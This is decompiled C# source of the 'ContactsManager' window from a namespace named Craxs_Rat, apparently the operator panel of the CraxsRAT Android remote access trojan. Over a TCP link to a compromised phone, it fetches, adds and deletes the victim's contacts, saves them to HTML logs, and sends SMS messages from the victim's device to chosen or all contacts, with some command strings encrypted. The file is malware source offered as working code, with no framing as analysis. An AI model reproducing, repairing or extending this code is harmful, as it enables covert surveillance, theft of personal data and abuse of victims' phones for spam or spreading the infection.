using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Vip.Notification;

namespace Craxs_Rat
{
	// Token: 0x020000AE RID: 174
	[DesignerGenerated]
	public partial class ContactsManager : Form
	{
		// Token: 0x06000B19 RID: 2841 RVA: 0x00077620 File Offset: 0x00075820
		public ContactsManager()
		{
			base.Load += this.ContactsManager_Load;
			base.Activated += this.ContactsManager_Activated;
			base.Deactivate += this.ContactsManager_Deactivate;
			this.string_0 = "null";
			this.bool_0 = false;
			this.InitializeComponent();
		}

		// Token: 0x1700031C RID: 796
		// (get) Token: 0x06000B1C RID: 2844 RVA: 0x000061FD File Offset: 0x000043FD
		// (set) Token: 0x06000B1D RID: 2845 RVA: 0x00077EF4 File Offset: 0x000760F4
		internal virtual DataGridView DGV0
		{
			[CompilerGenerated]
			get
			{
				return this._DGV0;
			}
			[CompilerGenerated]
			set
			{
				DataGridViewRowsRemovedEventHandler value2 = new DataGridViewRowsRemovedEventHandler(this.DGV0_RowsRemoved);
				DataGridViewRowsAddedEventHandler value3 = new DataGridViewRowsAddedEventHandler(this.DGV0_RowsAdded);
				EventHandler value4 = new EventHandler(this.DGV0_SelectionChanged);
				DataGridView dgv = this._DGV0;
				if (dgv != null)
				{
					dgv.RowsRemoved -= value2;
					dgv.RowsAdded -= value3;
					dgv.SelectionChanged -= value4;
				}
				this._DGV0 = value;
				dgv = this._DGV0;
				if (dgv != null)
				{
					dgv.RowsRemoved += value2;
					dgv.RowsAdded += value3;
					dgv.SelectionChanged += value4;
				}
			}
		}

		// Token: 0x1700031D RID: 797
		// (get) Token: 0x06000B1E RID: 2846 RVA: 0x00006205 File Offset: 0x00004405
		// (set) Token: 0x06000B1F RID: 2847 RVA: 0x00077F70 File Offset: 0x00076170
		internal virtual ContextMenuStrip ctxMenu { get; set; }

		// Token: 0x1700031E RID: 798
		// (get) Token: 0x06000B20 RID: 2848 RVA: 0x0000620D File Offset: 0x0000440D
		// (set) Token: 0x06000B21 RID: 2849 RVA: 0x00077F84 File Offset: 0x00076184
		internal virtual ToolStripMenuItem RefreshToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._RefreshToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.RefreshToolStripMenuItem_Click);
				ToolStripMenuItem refreshToolStripMenuItem = this._RefreshToolStripMenuItem;
				if (refreshToolStripMenuItem != null)
				{
					refreshToolStripMenuItem.Click -= value2;
				}
				this._RefreshToolStripMenuItem = value;
				refreshToolStripMenuItem = this._RefreshToolStripMenuItem;
				if (refreshToolStripMenuItem != null)
				{
					refreshToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700031F RID: 799
		// (get) Token: 0x06000B22 RID: 2850 RVA: 0x00006215 File Offset: 0x00004415
		// (set) Token: 0x06000B23 RID: 2851 RVA: 0x00077FC8 File Offset: 0x000761C8
		internal virtual ToolStripMenuItem AddToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._AddToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.AddToolStripMenuItem_Click);
				ToolStripMenuItem addToolStripMenuItem = this._AddToolStripMenuItem;
				if (addToolStripMenuItem != null)
				{
					addToolStripMenuItem.Click -= value2;
				}
				this._AddToolStripMenuItem = value;
				addToolStripMenuItem = this._AddToolStripMenuItem;
				if (addToolStripMenuItem != null)
				{
					addToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000320 RID: 800
		// (get) Token: 0x06000B24 RID: 2852 RVA: 0x0000621D File Offset: 0x0000441D
		// (set) Token: 0x06000B25 RID: 2853 RVA: 0x0007800C File Offset: 0x0007620C
		internal virtual ToolStripMenuItem DeleteToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._DeleteToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DeleteToolStripMenuItem_Click);
				ToolStripMenuItem deleteToolStripMenuItem = this._DeleteToolStripMenuItem;
				if (deleteToolStripMenuItem != null)
				{
					deleteToolStripMenuItem.Click -= value2;
				}
				this._DeleteToolStripMenuItem = value;
				deleteToolStripMenuItem = this._DeleteToolStripMenuItem;
				if (deleteToolStripMenuItem != null)
				{
					deleteToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000321 RID: 801
		// (get) Token: 0x06000B26 RID: 2854 RVA: 0x00006225 File Offset: 0x00004425
		// (set) Token: 0x06000B27 RID: 2855 RVA: 0x00078050 File Offset: 0x00076250
		internal virtual ToolStripMenuItem SaveToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._SaveToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.SaveToolStripMenuItem_Click);
				ToolStripMenuItem saveToolStripMenuItem = this._SaveToolStripMenuItem;
				if (saveToolStripMenuItem != null)
				{
					saveToolStripMenuItem.Click -= value2;
				}
				this._SaveToolStripMenuItem = value;
				saveToolStripMenuItem = this._SaveToolStripMenuItem;
				if (saveToolStripMenuItem != null)
				{
					saveToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000322 RID: 802
		// (get) Token: 0x06000B28 RID: 2856 RVA: 0x0000622D File Offset: 0x0000442D
		// (set) Token: 0x06000B29 RID: 2857 RVA: 0x00078094 File Offset: 0x00076294
		internal virtual ToolStripMenuItem SaveAsToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._SaveAsToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.SaveAsToolStripMenuItem_Click);
				ToolStripMenuItem saveAsToolStripMenuItem = this._SaveAsToolStripMenuItem;
				if (saveAsToolStripMenuItem != null)
				{
					saveAsToolStripMenuItem.Click -= value2;
				}
				this._SaveAsToolStripMenuItem = value;
				saveAsToolStripMenuItem = this._SaveAsToolStripMenuItem;
				if (saveAsToolStripMenuItem != null)
				{
					saveAsToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700032A RID: 810
		// (get) Token: 0x06000B2A RID: 2858 RVA: 0x00006235 File Offset: 0x00004435
		// (set) Token: 0x06000B2B RID: 2859 RVA: 0x000780D8 File Offset: 0x000762D8
		internal virtual System.Windows.Forms.Timer TOpacity
		{
			[CompilerGenerated]
			get
			{
				return this._TOpacity;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.TOpacity_Tick);
				System.Windows.Forms.Timer topacity = this._TOpacity;
				if (topacity != null)
				{
					topacity.Tick -= value2;
				}
				this._TOpacity = value;
				topacity = this._TOpacity;
				if (topacity != null)
				{
					topacity.Tick += value2;
				}
			}
		}

		// Token: 0x17000323 RID: 803
		// (get) Token: 0x06000B2C RID: 2860 RVA: 0x0000623D File Offset: 0x0000443D
		// (set) Token: 0x06000B2D RID: 2861 RVA: 0x0007811C File Offset: 0x0007631C
		internal virtual ProgressBar PB { get; set; }

		// Token: 0x17000324 RID: 804
		// (get) Token: 0x06000B2E RID: 2862 RVA: 0x00006245 File Offset: 0x00004445
		// (set) Token: 0x06000B2F RID: 2863 RVA: 0x00078130 File Offset: 0x00076330
		internal virtual PictureBox BoxTitle
		{
			[CompilerGenerated]
			get
			{
				return this._BoxTitle;
			}
			[CompilerGenerated]
			set
			{
				PaintEventHandler value2 = new PaintEventHandler(this.BoxTitle_Paint);
				EventHandler value3 = new EventHandler(this.BoxTitle_Resize);
				PictureBox boxTitle = this._BoxTitle;
				if (boxTitle != null)
				{
					boxTitle.Paint -= value2;
					boxTitle.Resize -= value3;
				}
				this._BoxTitle = value;
				boxTitle = this._BoxTitle;
				if (boxTitle != null)
				{
					boxTitle.Paint += value2;
					boxTitle.Resize += value3;
				}
			}
		}

		// Token: 0x17000325 RID: 805
		// (get) Token: 0x06000B30 RID: 2864 RVA: 0x0000624D File Offset: 0x0000444D
		// (set) Token: 0x06000B31 RID: 2865 RVA: 0x00078190 File Offset: 0x00076390
		internal virtual DataGridViewTextBoxColumn Column1 { get; set; }

		// Token: 0x17000326 RID: 806
		// (get) Token: 0x06000B32 RID: 2866 RVA: 0x00006255 File Offset: 0x00004455
		// (set) Token: 0x06000B33 RID: 2867 RVA: 0x000781A4 File Offset: 0x000763A4
		internal virtual DataGridViewTextBoxColumn Column6 { get; set; }

		// Token: 0x17000327 RID: 807
		// (get) Token: 0x06000B34 RID: 2868 RVA: 0x0000625D File Offset: 0x0000445D
		// (set) Token: 0x06000B35 RID: 2869 RVA: 0x000781B8 File Offset: 0x000763B8
		internal virtual DataGridViewTextBoxColumn Column9 { get; set; }

		// Token: 0x17000328 RID: 808
		// (get) Token: 0x06000B36 RID: 2870 RVA: 0x00006265 File Offset: 0x00004465
		// (set) Token: 0x06000B37 RID: 2871 RVA: 0x000781CC File Offset: 0x000763CC
		internal virtual DataGridViewImageColumn Column2 { get; set; }

		// Token: 0x17000329 RID: 809
		// (get) Token: 0x06000B38 RID: 2872 RVA: 0x0000626D File Offset: 0x0000446D
		// (set) Token: 0x06000B39 RID: 2873 RVA: 0x000781E0 File Offset: 0x000763E0
		internal virtual ToolStripMenuItem SendSmsToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._SendSmsToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.SendSmsToolStripMenuItem_Click);
				ToolStripMenuItem sendSmsToolStripMenuItem = this._SendSmsToolStripMenuItem;
				if (sendSmsToolStripMenuItem != null)
				{
					sendSmsToolStripMenuItem.Click -= value2;
				}
				this._SendSmsToolStripMenuItem = value;
				sendSmsToolStripMenuItem = this._SendSmsToolStripMenuItem;
				if (sendSmsToolStripMenuItem != null)
				{
					sendSmsToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x06000B3A RID: 2874 RVA: 0x00078224 File Offset: 0x00076424
		private void method_0()
		{
			this.BoxTitle.BackColor = Module5.color_0;
			try
			{
				foreach (DataGridView dataGridView in base.Controls.OfType<DataGridView>())
				{
					dataGridView.BackgroundColor = Module5.color_0;
					dataGridView.BackColor = Module5.color_0;
					dataGridView.ColumnHeadersDefaultCellStyle.BackColor = Module5.color_0;
					dataGridView.DefaultCellStyle.BackColor = Module5.color_0;
					dataGridView.DefaultCellStyle.SelectionForeColor = Module5.color_0;
					dataGridView.DefaultCellStyle.ForeColor = Module5.White;
					dataGridView.DefaultCellStyle.SelectionBackColor = Module5.White;
					dataGridView.ColumnHeadersDefaultCellStyle.ForeColor = Module5.White;
				}
			}
			finally
			{
				IEnumerator<DataGridView> enumerator;
				if (enumerator != null)
				{
					enumerator.Dispose();
				}
			}
		}

		// Token: 0x06000B3B RID: 2875 RVA: 0x00078300 File Offset: 0x00076500
		private void TOpacity_Tick(object sender, EventArgs e)
		{
			if (base.Opacity == 1.0)
			{
				this.TOpacity.Enabled = false;
			}
			else
			{
				base.Opacity += 0.1;
			}
		}

		// Token: 0x06000B3C RID: 2876 RVA: 0x00078348 File Offset: 0x00076548
		private void ContactsManager_Load(object sender, EventArgs e)
		{
			base.Icon = new Icon(Module8.string_1 + "\\Icons\\win\\3.ico");
			this.method_0();
			this.ctxMenu.Renderer = new GClass12();
			this.DGV0.ColumnHeadersDefaultCellStyle.Font = Module8.font_1;
			this.DGV0.DefaultCellStyle.Font = Module8.font_1;
			if (Operators.CompareString(Module5.Saving_data, "No", false) == 0)
			{
				this.SaveToolStripMenuItem.Visible = true;
				this.SaveAsToolStripMenuItem.Visible = true;
			}
			this.Text = this.string_0;
			this.TOpacity.Interval = Module5.int_0;
			this.TOpacity.Enabled = true;
			this.bool_0 = true;
		}

		// Token: 0x06000B3D RID: 2877 RVA: 0x0007840C File Offset: 0x0007660C
		private void SaveToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Module8.smethod_5(this.gclass8_0);
			ThreadPool.QueueUserWorkItem((ContactsManager.Class15.waitCallback_0 != null) ? ContactsManager.Class15.waitCallback_0 : (ContactsManager.Class15.waitCallback_0 = new WaitCallback(ContactsManager.Class15.class15_0.method_0)), new object[]
			{
				this.DGV0,
				this.object_0,
				"Contacts Manager",
				this.object_1,
				this.string_1 + " - " + this.string_2,
				"Contacts",
				"log",
				DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html"
			});
		}

		// Token: 0x06000B3E RID: 2878 RVA: 0x000784C0 File Offset: 0x000766C0
		private void SaveAsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.FileName = DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html";
			saveFileDialog.Filter = "html (*.html)|*.html";
			if (saveFileDialog.ShowDialog() == DialogResult.OK)
			{
				ThreadPool.QueueUserWorkItem((ContactsManager.Class15.waitCallback_1 == null) ? (ContactsManager.Class15.waitCallback_1 = new WaitCallback(ContactsManager.Class15.class15_0.method_1)) : ContactsManager.Class15.waitCallback_1, new object[]
				{
					this.DGV0,
					"null",
					saveFileDialog.FileName,
					this.object_1,
					this.string_1 + " - " + this.string_2,
					"Contacts",
					"log",
					"null"
				});
			}
			saveFileDialog.Dispose();
		}

		// Token: 0x06000B3F RID: 2879 RVA: 0x00078598 File Offset: 0x00076798
		private void DeleteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			checked
			{
				if (this.DGV0.SelectedRows.Count > 0)
				{
					int num = this.DGV0.SelectedRows.Count - 1;
					for (int i = num; i >= 0; i += -1)
					{
						string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Tag);
						string text2 = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value);
						if (this.gclass8_0 != null)
						{
							object[] objects_ = new object[]
							{
								this.tcpClient_0,
								string.Concat(new string[]
								{
									Module13.string_28,
									GClass9.string_0,
									Module8.string_4,
									".contacts",
									GClass9.string_0,
									"method",
									GClass9.string_0,
									Module13.string_40,
									GClass9.string_0,
									"del",
									GClass9.string_1,
									text,
									GClass9.string_1,
									text2
								}),
								Module2.smethod_9().GetBytes("null"),
								this.gclass8_0
							};
							this.gclass8_0.method_2(objects_);
							this.DGV0.Rows.RemoveAt(this.DGV0.SelectedRows[i].Index);
						}
					}
				}
			}
		}

		// Token: 0x06000B40 RID: 2880 RVA: 0x00078738 File Offset: 0x00076938
		private void AddToolStripMenuItem_Click(object sender, EventArgs e)
		{
			AddNumber addNumber = new AddNumber();
			addNumber.Text = "Add new contact";
			addNumber.L0.Text = "Enter Name";
			addNumber.L1.Text = "Enter Number";
			addNumber.StartPosition = FormStartPosition.Manual;
			addNumber.Location = Module2.smethod_46(this, addNumber);
			DialogResult dialogResult = addNumber.ShowDialog(this);
			if (dialogResult == DialogResult.OK)
			{
				if (this.gclass8_0 != null)
				{
					object[] objects_ = new object[]
					{
						this.tcpClient_0,
						string.Concat(new string[]
						{
							Module13.string_28,
							GClass9.string_0,
							Module8.string_4,
							".contacts",
							GClass9.string_0,
							"method",
							GClass9.string_0,
							Module13.string_40,
							GClass9.string_0,
							"add",
							GClass9.string_1,
							addNumber.InputText0.Text,
							GClass9.string_1,
							addNumber.InputText1.Text
						}),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_0
					};
					this.gclass8_0.method_2(objects_);
				}
			}
			addNumber.Close();
		}

		// Token: 0x06000B41 RID: 2881 RVA: 0x00078878 File Offset: 0x00076A78
		private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				object[] objects_ = new object[]
				{
					this.tcpClient_0,
					string.Concat(new string[]
					{
						Module13.string_28,
						GClass9.string_0,
						Module8.string_4,
						".contacts",
						GClass9.string_0,
						"method",
						GClass9.string_0,
						Module13.string_3,
						GClass9.string_0,
						"contacts"
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
			}
		}

		// Token: 0x06000B42 RID: 2882 RVA: 0x0007892C File Offset: 0x00076B2C
		private void BoxTitle_Paint(object sender, PaintEventArgs e)
		{
			checked
			{
				if (this.bool_0)
				{
					int count = this.DGV0.Rows.Count;
					string str = "All " + Conversions.ToString(count);
					string str2 = "Selected " + Conversions.ToString(this.DGV0.SelectedRows.Count);
					Color white = Module5.White;
					e.Graphics.DrawLine(new Pen(Color.FromArgb(50, (int)white.R, (int)white.G, (int)white.B)), 0, 1, this.BoxTitle.Width, 1);
					Brush brush = new SolidBrush(Module5.White);
					Brush brush2 = new SolidBrush(Color.FromArgb(170, (int)this.BoxTitle.BackColor.R, (int)this.BoxTitle.BackColor.G, (int)this.BoxTitle.BackColor.B));
					Size size = TextRenderer.MeasureText(str + Strings.Space(10) + str2, Module8.font_1);
					Rectangle rect = new Rectangle(0, 2, this.BoxTitle.Width, size.Height + 5);
					e.Graphics.FillRectangle(new Pen(brush2).Brush, rect);
					e.Graphics.DrawString(str + Strings.Space(10) + str2 + Strings.Space(10), Module8.font_1, brush, 0f, 2f);
					Size size2 = TextRenderer.MeasureText("S", Module8.font_1);
					if (this.BoxTitle.Height != size2.Height + 3)
					{
						this.BoxTitle.Height = size2.Height + 3;
					}
				}
			}
		}

		// Token: 0x06000B43 RID: 2883 RVA: 0x00078AE0 File Offset: 0x00076CE0
		private void ContactsManager_Activated(object sender, EventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x06000B44 RID: 2884 RVA: 0x00078AE0 File Offset: 0x00076CE0
		private void ContactsManager_Deactivate(object sender, EventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x06000B45 RID: 2885 RVA: 0x00078AE0 File Offset: 0x00076CE0
		private void BoxTitle_Resize(object sender, EventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x06000B46 RID: 2886 RVA: 0x00078AF8 File Offset: 0x00076CF8
		private void SendSmsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			checked
			{
				try
				{
					if (this.DGV0.SelectedRows.Count > 0 && this.gclass8_0 != null)
					{
						smsMaker smsMaker = new smsMaker();
						int num = this.DGV0.SelectedRows.Count - 1;
						for (int i = 0; i <= num; i++)
						{
							string item = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value);
							smsMaker.numslist.Items.Add(item);
						}
						if (smsMaker.ShowDialog() == DialogResult.OK && smsMaker.numslist.Items.Count > 0)
						{
							string text = smsMaker.msgtext.Text;
							TcpClient tcpClient = this.gclass8_0.tcpClient_0;
							string[] array = this.gclass8_0.string_0.Split(new char[]
							{
								':'
							});
							int value = 0;
							int value2 = 0;
							if (!smsMaker.checkall.Checked)
							{
								int num2 = smsMaker.numslist.Items.Count - 1;
								for (int j = 0; j <= num2; j++)
								{
									string text2 = Conversions.ToString(smsMaker.numslist.Items[j]);
									if (!(string.IsNullOrEmpty(text2) | string.IsNullOrWhiteSpace(text2)))
									{
										object[] objects_ = new object[]
										{
											tcpClient,
											Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Module13.string_29 + GClass9.string_0, Module2.smethod_11("YcBFkd4jGXwxD5rP4InGOQ==")), text2), "#"), text), GClass9.string_0), array[0]), GClass9.string_0), array[1]), GClass9.string_0), Module13.string_5), GClass9.string_0), Conversions.ToString(value)), GClass9.string_0), Conversions.ToString(value2)), GClass9.string_0), GClass9.string_3), GClass9.string_0), this.gclass8_0.string_2),
											Module2.smethod_9().GetBytes("null"),
											this.gclass8_0
										};
										this.gclass8_0.method_2(objects_);
									}
								}
							}
							else
							{
								object[] objects_2 = new object[]
								{
									tcpClient,
									Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Module13.string_29 + GClass9.string_0, Module2.smethod_11("YcBFkd4jGXwxD5rP4InGOQ==")), "all<>"), text), "#"), GClass9.string_0), array[0]), GClass9.string_0), array[1]), GClass9.string_0), Module13.string_5), GClass9.string_0), Conversions.ToString(value)), GClass9.string_0), Conversions.ToString(value2)), GClass9.string_0), GClass9.string_3), GClass9.string_0), this.gclass8_0.string_2),
									Module2.smethod_9().GetBytes("null"),
									this.gclass8_0
								};
								this.gclass8_0.method_2(objects_2);
							}
							Alert.ShowSucess(Conversions.ToString(Module2.smethod_11("hsDAfeL7UykrbxSCTgjL/boElYxMzfSxFoFfTPEhR1T7BQRSfIXjISezO8i54iaL")));
						}
					}
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000B47 RID: 2887 RVA: 0x00078AE0 File Offset: 0x00076CE0
		private void DGV0_RowsRemoved(object sender, DataGridViewRowsRemovedEventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x06000B48 RID: 2888 RVA: 0x00078AE0 File Offset: 0x00076CE0
		private void DGV0_RowsAdded(object sender, DataGridViewRowsAddedEventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x06000B49 RID: 2889 RVA: 0x00078AE0 File Offset: 0x00076CE0
		private void DGV0_SelectionChanged(object sender, EventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x04000646 RID: 1606
		public TcpClient tcpClient_0;

		// Token: 0x04000647 RID: 1607
		public GClass8 gclass8_0;

		// Token: 0x04000648 RID: 1608
		public string string_0;

		// Token: 0x04000649 RID: 1609
		public string object_0;

		// Token: 0x0400064A RID: 1610
		public string object_1;

		// Token: 0x0400064B RID: 1611
		public string string_1;

		// Token: 0x0400064C RID: 1612
		public string string_2;

		// Token: 0x0400064D RID: 1613
		private bool bool_0;

		// Token: 0x020000AF RID: 175
		[CompilerGenerated]
		[Serializable]
		internal sealed class Class15
		{
			// Token: 0x06000B4C RID: 2892 RVA: 0x00021A70 File Offset: 0x0001FC70
			internal void method_0(object _object_0)
			{
				Module8.smethod_13((Array)_object_0);
			}

			// Token: 0x06000B4D RID: 2893 RVA: 0x00021A70 File Offset: 0x0001FC70
			internal void method_1(object _object_1)
			{
				Module8.smethod_13((Array)_object_1);
			}

			// Token: 0x0400064E RID: 1614
			public static readonly ContactsManager.Class15 class15_0 = new ContactsManager.Class15();

			// Token: 0x0400064F RID: 1615
			public static WaitCallback waitCallback_0;

			// Token: 0x04000650 RID: 1616
			public static WaitCallback waitCallback_1;
		}
	}
}
